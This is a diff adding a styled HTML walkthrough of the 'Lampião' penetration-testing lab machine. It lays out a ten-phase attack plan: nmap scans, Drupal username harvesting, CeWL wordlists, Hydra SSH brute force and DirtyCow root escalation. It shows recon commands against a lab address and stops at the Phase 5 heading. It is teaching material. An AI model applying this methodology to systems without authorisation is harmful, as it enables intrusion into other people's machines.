@@ -1,0 +1,1840 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lampiao Machine — Premium Penetration Testing Walkthrough</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@300;400;500;600;700&family=Orbitron:wght@500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+html {
+  scroll-behavior: smooth;
+}
+body {
+  font-family: 'Inter', sans-serif;
+  background: #0a0a0b;
+  color: #e8e6e3;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+::-webkit-scrollbar {
+  width: 6px;
+}
+::-webkit-scrollbar-track {
+  background: #0a0a0b;
+}
+::-webkit-scrollbar-thumb {
+  background: #d4380a;
+  border-radius: 3px;
+}
+h1, h2, h3, h4 {
+  font-family: 'Orbitron', sans-serif;
+  font-weight: 700;
+  letter-spacing: 1px;
+}
+h2 {
+  font-size: 1.8rem;
+  color: #f5421a;
+  margin-bottom: 1.5rem;
+  text-transform: uppercase;
+}
+h3 {
+  font-size: 1.2rem;
+  color: #ff7849;
+  margin-bottom: 1rem;
+}
+code, pre, .terminal, .cmd-text {
+  font-family: 'JetBrains Mono', monospace;
+}
+
+/* Navigation */
+#nav {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  z-index: 1000;
+  background: rgba(10,10,11,0.92);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid rgba(212,56,10,0.2);
+  padding: 0.6rem 2rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  transition: all 0.3s;
+}
+#nav .logo {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: #f5421a;
+  letter-spacing: 2px;
+}
+#nav .progress-wrap {
+  flex: 1;
+  max-width: 400px;
+  margin: 0 1.5rem;
+  height: 4px;
+  background: #1a1a1e;
+  border-radius: 2px;
+  overflow: hidden;
+}
+#nav .progress-bar {
+  height: 100%;
+  width: 0%;
+  background: linear-gradient(90deg, #d4380a, #f5421a, #ff7849);
+  border-radius: 2px;
+  transition: width 0.4s ease;
+}
+#nav .section-label {
+  font-size: 0.7rem;
+  color: #888;
+  font-family: 'JetBrains Mono', monospace;
+  min-width: 140px;
+  text-align: right;
+}
+
+/* Hero */
+.hero {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 6rem 2rem 4rem;
+  position: relative;
+  overflow: hidden;
+  background: radial-gradient(ellipse at 50% 30%, rgba(212,56,10,0.08) 0%, transparent 60%),
+              radial-gradient(ellipse at 80% 70%, rgba(245,66,26,0.05) 0%, transparent 50%),
+              #0a0a0b;
+}
+.hero::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background:
+    repeating-linear-gradient(0deg, transparent, transparent 40px, rgba(212,56,10,0.03) 40px, rgba(212,56,10,0.03) 41px),
+    repeating-linear-gradient(90deg, transparent, transparent 40px, rgba(212,56,10,0.03) 40px, rgba(212,56,10,0.03) 41px);
+  pointer-events: none;
+}
+.hero-canvas {
+  position: absolute;
+  inset: 0;
+  z-index: 0;
+}
+.hero > * {
+  position: relative;
+  z-index: 1;
+}
+.hero h1 {
+  font-size: clamp(2.5rem, 7vw, 5.5rem);
+  font-weight: 900;
+  color: #fff;
+  text-transform: uppercase;
+  letter-spacing: 6px;
+  margin-bottom: 1.2rem;
+  text-shadow: 0 0 60px rgba(245,66,26,0.3);
+}
+.hero h1 span {
+  color: #f5421a;
+}
+.hero .subtitle {
+  max-width: 720px;
+  font-size: 1.05rem;
+  color: #bbb;
+  line-height: 1.8;
+  margin-bottom: 2rem;
+  font-weight: 300;
+}
+.hero .status-logs {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0.4rem;
+  margin-bottom: 2.5rem;
+  min-height: 200px;
+}
+.hero .status-logs .log {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  color: #666;
+  opacity: 0;
+  transition: all 0.5s ease;
+  letter-spacing: 0.5px;
+}
+.hero .status-logs .log.visible {
+  opacity: 1;
+  color: #4ade80;
+}
+.hero .status-logs .log.visible.dim {
+  color: #888;
+}
+.hero .status-logs .log.visible.current {
+  color: #f5421a;
+  text-shadow: 0 0 20px rgba(245,66,26,0.3);
+}
+.hero-buttons {
+  display: flex;
+  gap: 1rem;
+  flex-wrap: wrap;
+  justify-content: center;
+}
+.hero-btn {
+  display: inline-block;
+  padding: 0.9rem 2.5rem;
+  border-radius: 6px;
+  font-family: 'Inter', sans-serif;
+  font-weight: 600;
+  font-size: 0.85rem;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  cursor: pointer;
+  text-decoration: none;
+  transition: all 0.3s;
+  border: none;
+}
+.hero-btn.primary {
+  background: linear-gradient(135deg, #d4380a, #f5421a);
+  color: #fff;
+  box-shadow: 0 4px 30px rgba(212,56,10,0.3);
+}
+.hero-btn.primary:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 40px rgba(212,56,10,0.5);
+}
+.hero-btn.secondary {
+  background: transparent;
+  color: #ff7849;
+  border: 1px solid rgba(245,66,26,0.4);
+}
+.hero-btn.secondary:hover {
+  border-color: #f5421a;
+  background: rgba(212,56,10,0.1);
+}
+
+/* Sections */
+.section {
+  padding: 5rem 2rem;
+  max-width: 1100px;
+  margin: 0 auto;
+}
+.section-alt {
+  background: linear-gradient(135deg, #0d0d0f 0%, #111114 100%);
+  border-top: 1px solid rgba(212,56,10,0.08);
+  border-bottom: 1px solid rgba(212,56,10,0.08);
+}
+
+/* Glass Card */
+.glass {
+  background: rgba(20,20,25,0.6);
+  backdrop-filter: blur(16px);
+  border: 1px solid rgba(212,56,10,0.12);
+  border-radius: 12px;
+  padding: 2rem;
+  transition: all 0.3s;
+}
+.glass:hover {
+  border-color: rgba(212,56,10,0.3);
+  box-shadow: 0 8px 40px rgba(212,56,10,0.08);
+}
+
+/* Terminal block */
+.terminal-block {
+  background: #0d0d0f;
+  border: 1px solid rgba(212,56,10,0.2);
+  border-radius: 8px;
+  padding: 1.2rem 1.5rem;
+  margin: 1rem 0;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.82rem;
+  line-height: 1.8;
+  overflow-x: auto;
+  color: #d4d4d4;
+  position: relative;
+}
+.terminal-block .prompt {
+  color: #4ade80;
+}
+.terminal-block .cmd {
+  color: #ff7849;
+}
+.terminal-block .output {
+  color: #aaa;
+}
+.terminal-block .highlight {
+  color: #f5421a;
+  font-weight: 600;
+}
+.terminal-block .comment {
+  color: #6a9955;
+  font-style: italic;
+}
+
+/* Attack Flow */
+.attack-flow {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0;
+  margin: 2rem 0;
+}
+.flow-node {
+  background: rgba(20,20,25,0.6);
+  backdrop-filter: blur(8px);
+  border: 1px solid rgba(212,56,10,0.15);
+  border-radius: 8px;
+  padding: 1rem 2rem;
+  min-width: 260px;
+  text-align: center;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+}
+.flow-node:hover {
+  border-color: #f5421a;
+  background: rgba(212,56,10,0.1);
+  transform: translateX(4px);
+}
+.flow-node .node-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.75rem;
+  color: #f5421a;
+  letter-spacing: 1.5px;
+  text-transform: uppercase;
+  margin-bottom: 0.3rem;
+}
+.flow-node .node-desc {
+  font-size: 0.85rem;
+  color: #ccc;
+  font-weight: 300;
+}
+.flow-arrow {
+  color: rgba(212,56,10,0.4);
+  font-size: 1.2rem;
+  padding: 0.1rem 0;
+  line-height: 1;
+}
+.flow-node.expanded .node-detail {
+  max-height: 300px;
+  opacity: 1;
+  padding-top: 0.8rem;
+}
+.flow-node .node-detail {
+  max-height: 0;
+  opacity: 0;
+  overflow: hidden;
+  transition: all 0.4s ease;
+  font-size: 0.8rem;
+  color: #999;
+  border-top: 1px solid rgba(212,56,10,0.1);
+  margin-top: 0;
+  text-align: left;
+}
+
+/* Info Cards Grid */
+.grid-3, .grid-4 {
+  display: grid;
+  gap: 1.2rem;
+  margin: 1.5rem 0;
+}
+.grid-3 {
+  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+}
+.grid-4 {
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+}
+.info-card {
+  background: rgba(20,20,25,0.5);
+  backdrop-filter: blur(8px);
+  border: 1px solid rgba(212,56,10,0.1);
+  border-radius: 10px;
+  padding: 1.5rem;
+  transition: all 0.3s;
+}
+.info-card:hover {
+  border-color: rgba(212,56,10,0.3);
+  transform: translateY(-3px);
+  box-shadow: 0 8px 30px rgba(212,56,10,0.06);
+}
+.info-card .card-icon {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.5rem;
+  color: #f5421a;
+  margin-bottom: 0.6rem;
+}
+.info-card .card-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.75rem;
+  color: #ff7849;
+  letter-spacing: 1px;
+  margin-bottom: 0.5rem;
+  text-transform: uppercase;
+}
+.info-card .card-text {
+  font-size: 0.82rem;
+  color: #aaa;
+  line-height: 1.6;
+}
+
+/* Table */
+.table-wrap {
+  overflow-x: auto;
+  margin: 1rem 0;
+}
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.85rem;
+}
+table th {
+  background: rgba(212,56,10,0.12);
+  color: #ff7849;
+  padding: 0.7rem 1rem;
+  text-align: left;
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.7rem;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  border-bottom: 1px solid rgba(212,56,10,0.2);
+}
+table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid rgba(255,255,255,0.04);
+  color: #bbb;
+}
+table tr:hover td {
+  color: #fff;
+}
+
+/* Simulation Container */
+.sim-container {
+  background: rgba(10,10,12,0.8);
+  border: 1px solid rgba(212,56,10,0.15);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1.5rem 0;
+  min-height: 200px;
+}
+.sim-output {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  line-height: 1.7;
+  color: #bbb;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+.sim-output .sim-prompt {
+  color: #4ade80;
+}
+.sim-output .sim-cmd {
+  color: #ff7849;
+}
+.sim-output .sim-success {
+  color: #4ade80;
+}
+.sim-output .sim-info {
+  color: #60a5fa;
+}
+.sim-output .sim-error {
+  color: #ef4444;
+}
+.sim-output .sim-highlight {
+  color: #f5421a;
+  font-weight: 600;
+}
+.sim-btn {
+  display: inline-block;
+  padding: 0.5rem 1.2rem;
+  background: rgba(212,56,10,0.15);
+  color: #f5421a;
+  border: 1px solid rgba(212,56,10,0.3);
+  border-radius: 5px;
+  font-family: 'Inter', sans-serif;
+  font-size: 0.75rem;
+  cursor: pointer;
+  transition: all 0.3s;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin: 0.3rem;
+}
+.sim-btn:hover {
+  background: rgba(212,56,10,0.3);
+  border-color: #f5421a;
+}
+.sim-btn:disabled {
+  opacity: 0.4;
+  cursor: not-allowed;
+}
+
+/* DirtyCow Flow */
+.dc-flow {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0;
+  margin: 1.5rem 0;
+}
+.dc-node {
+  background: rgba(20,20,25,0.5);
+  border: 1px solid rgba(245,66,26,0.15);
+  border-radius: 8px;
+  padding: 0.8rem 1.5rem;
+  min-width: 200px;
+  text-align: center;
+  font-size: 0.8rem;
+  color: #ccc;
+  transition: all 0.4s;
+}
+.dc-node.active {
+  border-color: #f5421a;
+  background: rgba(212,56,10,0.1);
+  box-shadow: 0 0 30px rgba(212,56,10,0.1);
+}
+.dc-arrow {
+  color: rgba(245,66,26,0.3);
+  font-size: 1rem;
+  padding: 0.1rem 0;
+}
+
+/* Attack Chain Final */
+.chain {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0;
+  margin: 2rem 0;
+}
+.chain .link {
+  background: rgba(20,20,25,0.5);
+  border: 1px solid rgba(212,56,10,0.1);
+  border-radius: 6px;
+  padding: 0.6rem 1.5rem;
+  min-width: 200px;
+  text-align: center;
+  font-size: 0.8rem;
+  color: #ccc;
+  transition: all 0.3s;
+}
+.chain .link:nth-child(odd) {
+  border-color: rgba(212,56,10,0.2);
+}
+.chain .arrow {
+  color: rgba(212,56,10,0.3);
+  font-size: 0.9rem;
+  padding: 0.1rem 0;
+}
+
+/* Architecture Diagram */
+.arch {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 0.3rem;
+  margin: 1.5rem 0;
+}
+.arch .layer {
+  background: rgba(20,20,25,0.5);
+  border: 1px solid rgba(245,66,26,0.15);
+  border-radius: 6px;
+  padding: 0.7rem 2rem;
+  min-width: 180px;
+  text-align: center;
+  font-size: 0.8rem;
+  color: #ccc;
+}
+.arch .layer.highlight {
+  border-color: #f5421a;
+  background: rgba(212,56,10,0.08);
+  color: #ff7849;
+}
+.arch .conn {
+  color: rgba(212,56,10,0.3);
+  font-size: 0.8rem;
+}
+
+/* CEWL Flow */
+.cewl-flow {
+  display: flex;
+  flex-direction: row;
+  flex-wrap: wrap;
+  justify-content: center;
+  align-items: center;
+  gap: 0.5rem;
+  margin: 1.5rem 0;
+}
+.cewl-flow .cf-step {
+  background: rgba(20,20,25,0.5);
+  border: 1px solid rgba(245,66,26,0.12);
+  border-radius: 6px;
+  padding: 0.6rem 1.2rem;
+  text-align: center;
+  font-size: 0.75rem;
+  color: #aaa;
+  min-width: 120px;
+}
+.cewl-flow .cf-arrow {
+  color: rgba(212,56,10,0.3);
+  font-size: 1.2rem;
+}
+
+/* Quote Section */
+.quote-section {
+  text-align: center;
+  padding: 5rem 2rem;
+  max-width: 800px;
+  margin: 0 auto;
+}
+.quote-section blockquote {
+  font-size: 1.8rem;
+  font-weight: 300;
+  color: #fff;
+  line-height: 1.5;
+  margin-bottom: 1.5rem;
+  font-style: italic;
+}
+.quote-section blockquote::before {
+  content: '\201C';
+  color: #f5421a;
+  font-size: 3rem;
+  line-height: 0;
+  vertical-align: -0.5rem;
+  margin-right: 0.3rem;
+}
+.quote-section .cite {
+  color: #888;
+  font-size: 0.85rem;
+  font-family: 'Orbitron', sans-serif;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+
+/* Split Layout */
+.split {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 2rem;
+  margin: 1.5rem 0;
+}
+@media (max-width: 768px) {
+  .split {
+    grid-template-columns: 1fr;
+  }
+}
+
+/* Success Badge */
+.success-badge {
+  display: inline-block;
+  background: rgba(74,222,128,0.1);
+  border: 1px solid rgba(74,222,128,0.3);
+  color: #4ade80;
+  padding: 0.4rem 1rem;
+  border-radius: 4px;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.78rem;
+  margin: 0.5rem 0;
+}
+
+/* Tags */
+.tag {
+  display: inline-block;
+  background: rgba(212,56,10,0.12);
+  color: #ff7849;
+  padding: 0.2rem 0.7rem;
+  border-radius: 3px;
+  font-size: 0.7rem;
+  font-family: 'JetBrains Mono', monospace;
+  margin: 0.2rem;
+}
+
+/* Attacker Mindset Box */
+.mindset {
+  background: rgba(212,56,10,0.06);
+  border-left: 3px solid #f5421a;
+  padding: 1rem 1.5rem;
+  margin: 1rem 0;
+  border-radius: 0 8px 8px 0;
+}
+.mindset .label {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.65rem;
+  color: #f5421a;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  margin-bottom: 0.3rem;
+}
+.mindset p {
+  font-size: 0.85rem;
+  color: #ccc;
+  font-style: italic;
+}
+
+/* Lessons Grid */
+.lessons-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 1rem;
+  margin: 1.5rem 0;
+}
+.lesson-card {
+  background: rgba(20,20,25,0.5);
+  border: 1px solid rgba(212,56,10,0.1);
+  border-radius: 8px;
+  padding: 1.2rem;
+  text-align: center;
+  transition: all 0.3s;
+}
+.lesson-card:hover {
+  border-color: rgba(212,56,10,0.3);
+  transform: translateY(-2px);
+}
+.lesson-card .num {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 1.8rem;
+  color: #f5421a;
+  opacity: 0.5;
+  margin-bottom: 0.3rem;
+}
+.lesson-card h4 {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.75rem;
+  color: #ff7849;
+  letter-spacing: 1px;
+  margin-bottom: 0.4rem;
+  text-transform: uppercase;
+}
+.lesson-card p {
+  font-size: 0.8rem;
+  color: #999;
+}
+
+/* Utility */
+.mt-1 { margin-top: 1rem; }
+.mt-2 { margin-top: 2rem; }
+.mb-1 { margin-bottom: 1rem; }
+.mb-2 { margin-bottom: 2rem; }
+.text-orange { color: #f5421a; }
+.text-green { color: #4ade80; }
+.text-muted { color: #888; }
+.text-sm { font-size: 0.82rem; }
+.flex-center { display: flex; align-items: center; justify-content: center; gap: 0.5rem; flex-wrap: wrap; }
+
+/* Defensive Cards */
+.def-card {
+  background: rgba(20,20,25,0.5);
+  border: 1px solid rgba(96,165,250,0.1);
+  border-radius: 8px;
+  padding: 1.2rem;
+  margin: 0.8rem 0;
+  border-left: 3px solid rgba(96,165,250,0.3);
+}
+.def-card .def-title {
+  font-family: 'Orbitron', sans-serif;
+  font-size: 0.7rem;
+  color: #60a5fa;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  margin-bottom: 0.3rem;
+}
+.def-card p {
+  font-size: 0.82rem;
+  color: #aaa;
+}
+
+/* Footer */
+footer {
+  text-align: center;
+  padding: 3rem 2rem;
+  border-top: 1px solid rgba(212,56,10,0.08);
+  font-size: 0.75rem;
+  color: #555;
+}
+footer a {
+  color: #f5421a;
+  text-decoration: none;
+}
+
+/* Responsive */
+@media (max-width: 600px) {
+  .section {
+    padding: 3rem 1.2rem;
+  }
+  .glass {
+    padding: 1.2rem;
+  }
+  #nav {
+    padding: 0.4rem 1rem;
+  }
+  #nav .section-label {
+    display: none;
+  }
+}
+</style>
+</head>
+<body>
+
+<nav id="nav">
+  <span class="logo">LAMPIÃO</span>
+  <div class="progress-wrap">
+    <div class="progress-bar" id="progressBar"></div>
+  </div>
+  <span class="section-label" id="sectionLabel">Start</span>
+</nav>
+
+<!-- ====== HERO ====== -->
+<section class="hero" id="hero">
+  <canvas class="hero-canvas" id="heroCanvas"></canvas>
+  <h1>LAMPIÃO <span>MACHINE</span></h1>
+  <p class="subtitle">Understanding real-world penetration testing methodology through reconnaissance, credential attacks, SSH compromise, privilege escalation, and kernel exploitation.</p>
+  <div class="status-logs" id="statusLogs"></div>
+  <div class="hero-buttons">
+    <a href="#overview" class="hero-btn primary">Start Walkthrough</a>
+    <a href="#simulations" class="hero-btn secondary">Launch Simulations</a>
+  </div>
+</section>
+
+<!-- ====== OVERVIEW ====== -->
+<section class="section" id="overview">
+  <h2>Machine Overview</h2>
+  <p class="text-sm mb-2" style="color:#999;">Lampião is an educational penetration testing lab machine designed to teach real-world offensive security methodology. It simulates a vulnerable Linux server running Drupal CMS with exposed SSH, weak credentials, and a kernel vulnerable to DirtyCow privilege escalation.</p>
+  <div class="grid-4">
+    <div class="info-card">
+      <div class="card-icon">CMS</div>
+      <div class="card-title">Drupal CMS</div>
+      <div class="card-text">Content management system — exposed user enumeration, version identification, and web attack surface.</div>
+    </div>
+    <div class="info-card">
+      <div class="card-icon">22</div>
+      <div class="card-title">SSH</div>
+      <div class="card-text">Open SSH service on port 22 — allows remote login, exposed to brute-force credential attacks.</div>
+    </div>
+    <div class="info-card">
+      <div class="card-icon">HYD</div>
+      <div class="card-title">Hydra</div>
+      <div class="card-text">Fast network login cracker — used to brute-force SSH credentials with targeted wordlists.</div>
+    </div>
+    <div class="info-card">
+      <div class="card-icon">CEW</div>
+      <div class="card-title">CEWL</div>
+      <div class="card-text">Custom wordlist generator — extracts site-specific words to create contextual password lists.</div>
+    </div>
+    <div class="info-card">
+      <div class="card-icon">DC</div>
+      <div class="card-title">DirtyCow</div>
+      <div class="card-text">CVE-2016-5195 — kernel race condition allowing privilege escalation from user to root.</div>
+    </div>
+    <div class="info-card">
+      <div class="card-icon">PE</div>
+      <div class="card-title">Privilege Escalation</div>
+      <div class="card-text">Core red-team skill — elevating access from low-privilege user to full administrative root control.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== ATTACK FLOW ====== -->
+<section class="section section-alt" id="attackflow">
+  <h2>Overall Attack Flow</h2>
+  <p class="text-sm mb-2" style="color:#999;">Click each phase to expand the attacker's reasoning and methodology.</p>
+  <div class="attack-flow" id="attackFlow">
+    <div class="flow-node" data-detail="Locate the target machine on the network by scanning the subnet for live hosts using ICMP ping sweeps.">
+      <div class="node-title">Phase 1</div>
+      <div class="node-desc">Network Discovery</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Identify open ports and running services on the target to understand the attack surface and potential entry points.">
+      <div class="node-title">Phase 2</div>
+      <div class="node-desc">Port Scanning</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Explore HTTP services to identify CMS platforms, application versions, and extract useful information from the web application.">
+      <div class="node-title">Phase 3</div>
+      <div class="node-desc">Web Enumeration</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Extract usernames from exposed CMS author pages — web usernames often match system usernames.">
+      <div class="node-title">Phase 4</div>
+      <div class="node-desc">Username Discovery</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Generate a custom, context-aware password list by crawling the target website for relevant words and phrases.">
+      <div class="node-title">Phase 5</div>
+      <div class="node-desc">Password Generation</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Launch a targeted brute-force attack against SSH using the harvested usernames and custom password list.">
+      <div class="node-title">Phase 6</div>
+      <div class="node-desc">Hydra Brute Force</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Authenticate to the target via SSH using discovered credentials to obtain a shell on the remote system.">
+      <div class="node-title">Phase 7</div>
+      <div class="node-desc">SSH Access</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Enumerate the compromised system — kernel version, OS details, user privileges — to identify escalation vectors.">
+      <div class="node-title">Phase 8</div>
+      <div class="node-desc">Local Enumeration</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Identify and exploit the DirtyCow kernel race condition vulnerability to elevate privileges to root.">
+      <div class="node-title">Phase 9</div>
+      <div class="node-desc">DirtyCow Exploitation</div>
+      <div class="node-detail"></div>
+    </div>
+    <div class="flow-arrow">&#9660;</div>
+    <div class="flow-node" data-detail="Authenticate as root, capture the flag, and understand the complete attack chain from start to finish.">
+      <div class="node-title">Phase 10</div>
+      <div class="node-desc">Root Access</div>
+      <div class="node-detail"></div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== NETWORK DISCOVERY ====== -->
+<section class="section" id="network-discovery">
+  <h2>Phase 1: Network Discovery</h2>
+  <div class="glass">
+    <h3>Identifying Live Hosts</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">The first step in any penetration test is identifying active systems on the target network. We use an ICMP ping sweep to discover live hosts.</p>
+    <div class="terminal-block">
+      <span class="comment"># Scan the subnet for live hosts</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">nmap -sn 192.168.56.0/24</span><br>
+      <span class="output">Starting Nmap 7.94 (https://nmap.org)</span><br>
+      <span class="output">Nmap scan report for 192.168.56.1</span><br>
+      <span class="output">Nmap scan report for 192.168.56.100</span><br>
+      <span class="output">Nmap scan report for 192.168.56.103</span><br>
+      <span class="output">Host is up (0.0012s latency).</span><br>
+      <span class="output highlight">Target identified: 192.168.56.103</span>
+    </div>
+    <div class="mindset">
+      <div class="label">Attacker Thinking</div>
+      <p>"Before attacking anything, I must first identify which systems are active. Scanning the subnet reveals live targets and narrows my focus."</p>
+    </div>
+    <p class="text-sm mt-1" style="color:#aaa;">The <strong>-sn</strong> flag performs a ping scan (host discovery) without port scanning. This is fast and low-noise, ideal for initial reconnaissance.</p>
+  </div>
+</section>
+
+<!-- ====== PORT SCANNING ====== -->
+<section class="section section-alt" id="port-scanning">
+  <h2>Phase 2: Port Scanning</h2>
+  <div class="glass">
+    <h3>Service Enumeration</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Once the target is identified, we scan for open ports and running services to map the attack surface.</p>
+    <div class="terminal-block">
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">nmap -sC -sV 192.168.56.103</span><br>
+      <span class="output">Starting Nmap 7.94 (https://nmap.org)</span><br>
+      <span class="output">PORT     STATE    SERVICE    VERSION</span><br>
+      <span class="output highlight">22/tcp   open     ssh        OpenSSH 6.6.1p1</span><br>
+      <span class="output">80/tcp   open     http       Apache httpd</span><br>
+      <span class="output highlight">1898/tcp open     http       Apache httpd (Drupal CMS)</span>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Findings</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Port</th><th>Service</th><th>Importance</th></tr>
+            <tr><td>22</td><td>SSH</td><td>Login attack possible</td></tr>
+            <tr><td>80</td><td>HTTP</td><td>Web enumeration</td></tr>
+            <tr><td>1898</td><td>HTTP (Drupal)</td><td>Primary web app entry</td></tr>
+          </table>
+        </div>
+      </div>
+      <div>
+        <h3>Flags Explained</h3>
+        <div class="info-card" style="margin-bottom:0.5rem;">
+          <div class="card-title">-sC</div>
+          <div class="card-text">Run default NSE scripts — automated enumeration of service details, vulnerabilities, and configuration issues.</div>
+        </div>
+        <div class="info-card">
+          <div class="card-title">-sV</div>
+          <div class="card-text">Probe open ports to determine service version information — critical for identifying vulnerable software versions.</div>
+        </div>
+      </div>
+    </div>
+    <div class="mindset">
+      <div class="label">Attacker Thinking</div>
+      <p>"The web application is likely my entry point. SSH is open, which means if I can find credentials, I can get a shell. Version information helps me plan specific attacks."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== WEB ENUMERATION ====== -->
+<section class="section" id="web-enum">
+  <h2>Phase 3: Web Enumeration</h2>
+  <div class="glass">
+    <h3>Drupal CMS Discovery</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Browsing to port 1898 reveals a Drupal CMS instance. Exploring the site exposes critical information — including author usernames.</p>
+    <div class="terminal-block">
+      <span class="comment"># Browse to Drupal CMS</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">curl -s http://192.168.56.103:1898/ | grep -i "author\|user\|name"</span><br>
+      <span class="output">&lt;span class="username"&gt;tiago&lt;/span&gt;</span><br>
+      <span class="output">&lt;span class="username"&gt;Eder&lt;/span&gt;</span><br>
+      <br>
+      <span class="comment"># Usernames discovered:</span><br>
+      <span class="output highlight">tiago</span><br>
+      <span class="output highlight">Eder</span>
+    </div>
+    <div class="mindset">
+      <div class="label">Attacker Thinking</div>
+      <p>"CMS author pages publicly expose usernames. Developers often reuse the same username across services — these Drupal usernames might work for SSH login too."</p>
+    </div>
+    <div class="info-card" style="margin-top:1rem;">
+      <div class="card-title">Real-World Insight</div>
+      <div class="card-text">CMS platforms often leak user information through author pages, blog posts, or comments. Username enumeration is a critical reconnaissance step because people frequently reuse usernames across different systems.</div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== DRUPAL CMS UNDERSTANDING ====== -->
+<section class="section section-alt" id="drupal">
+  <h2>Phase 4: Drupal CMS Architecture</h2>
+  <div class="glass">
+    <h3>How Drupal Works</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Understanding the underlying architecture helps attackers identify weak points in the CMS stack.</p>
+    <div class="arch">
+      <div class="layer">Browser (Client)</div>
+      <div class="conn">&#8595;</div>
+      <div class="layer">Apache / Nginx (Web Server)</div>
+      <div class="conn">&#8595;</div>
+      <div class="layer highlight">PHP (Application Layer)</div>
+      <div class="conn">&#8595;</div>
+      <div class="layer">MySQL / MariaDB (Database)</div>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Attack Surfaces</h3>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;">
+          <li style="padding:0.3rem 0;">&#8226; Exposed user enumeration</li>
+          <li style="padding:0.3rem 0;">&#8226; Plugin/module vulnerabilities</li>
+          <li style="padding:0.3rem 0;">&#8226; SQL injection via database layer</li>
+          <li style="padding:0.3rem 0;">&#8226; Authentication bypass vectors</li>
+          <li style="padding:0.3rem 0;">&#8226; Configuration file disclosure</li>
+        </ul>
+      </div>
+      <div>
+        <h3>Why Usernames Matter</h3>
+        <p class="text-sm" style="color:#aaa;">CMS user accounts are often linked to content authors. Developers frequently use the same usernames for system accounts (SSH, FTP, database).</p>
+        <p class="text-sm mt-1" style="color:#aaa;">A username is <strong>half the credential</strong> — reducing brute-force complexity from exponential to linear.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== USERNAME ENUMERATION ====== -->
+<section class="section" id="username-enum">
+  <h2>Phase 5: Username Enumeration</h2>
